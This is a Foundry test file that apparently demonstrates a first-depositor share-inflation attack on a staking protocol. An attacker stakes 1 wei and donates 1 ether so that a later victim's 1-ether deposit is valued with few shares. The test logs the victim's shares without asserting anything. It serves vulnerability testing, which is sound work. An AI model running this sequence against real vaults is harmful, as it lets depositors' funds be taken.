// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {StakingManager} from "../../src/core/StakingManager.sol";
import {LSToken} from "../../src/core/LSToken.sol";
import {ValidatorRegistry} from "../../src/core/ValidatorRegistry.sol";
import {RewardDistributor} from "../../src/rewards/RewardDistributor.sol";
import {AccessManager} from "../../src/access/AccessManager.sol";

contract InflationAttackTest is Test {
    StakingManager public stakingManager;
    LSToken public lsToken;
    AccessManager public accessManager;
    ValidatorRegistry public validatorRegistry;
    RewardDistributor public rewardDistributor;

    address public admin = makeAddr("admin");
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    function setUp() public {
        vm.startPrank(admin);

        accessManager = new AccessManager(admin);
        lsToken = new LSToken(address(accessManager));
        validatorRegistry = new ValidatorRegistry(address(accessManager));
        rewardDistributor = new RewardDistributor();
        stakingManager = new StakingManager(address(lsToken), address(validatorRegistry));

        accessManager.grantRole(accessManager.MINTER_ROLE(), address(stakingManager));
        accessManager.grantRole(accessManager.BURNER_ROLE(), address(stakingManager));

        vm.stopPrank();

        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);
    }

    function testInflationAttack() public {
        vm.startPrank(attacker);
        stakingManager.stake{value: 1}();
        console.log("Attacker staked 1 wei");

        (bool success,) = address(stakingManager).call{value: 1 ether}("");
        require(success, "Donation failed");
        console.log("Attacker donated 1 ether");

        vm.stopPrank();

        vm.startPrank(victim);
        stakingManager.stake{value: 1 ether}();
        console.log("Victim staked 1 ether");

        uint256 victimShares = lsToken.balanceOf(victim);
        console.log("Victim shares : ", victimShares);

        vm.stopPrank();
    }
}
